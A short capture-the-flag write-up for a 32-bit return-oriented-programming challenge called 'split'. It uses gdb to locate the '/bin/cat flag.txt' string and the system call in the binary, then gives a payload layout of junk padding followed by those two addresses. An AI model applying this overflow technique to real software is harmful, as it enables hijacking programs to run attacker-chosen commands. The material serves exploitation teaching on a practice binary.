# split - 32bit

The string we need (`/bin/cat flag.txt`) is present in the binary.

To find its memory location:

Run `gdb` and break at `main` (`b main`).

Then once the breakpoint has hit run `find <STRING>`. This will display all string locations with `<STRING>` in them.

```
gdb-peda$ find /bin/cat

Searching for '/bin/cat' in: None ranges
Found 1 results, display max 1 items:
split32 : 0x804a030 ("/bin/cat flag.txt")
```

We are provided with a function `usefulFunction`:

```
Dump of assembler code for function usefulFunction:
   0x08048649 <+0>:	    push   ebp
   0x0804864a <+1>:	    mov    ebp,esp
   0x0804864c <+3>:	    sub    esp,0x8
   0x0804864f <+6>:	    sub    esp,0xc
   0x08048652 <+9>:	    push   0x8048747
   0x08048657 <+14>:	call   0x8048430 <system@plt>
   0x0804865c <+19>:	add    esp,0x10
   0x0804865f <+22>:	nop
   0x08048660 <+23>:	leave  
   0x08048661 <+24>:	ret    
End of assembler dump.
```

That provides us with a static address for `system` (0x08048657). We not want to use the `/bin/cat flag.txt` as an argument for `system`.

Our payload will have:

```
junk            p32(0x90 x 44 bytes)
system addr     p32(0x08048657)
bin_cat addr    p32(0x0804a030)
exit addr       p32(0x90) [JUNK]
```

Running this allows us to create a ROP chain of sorts that exploits the program!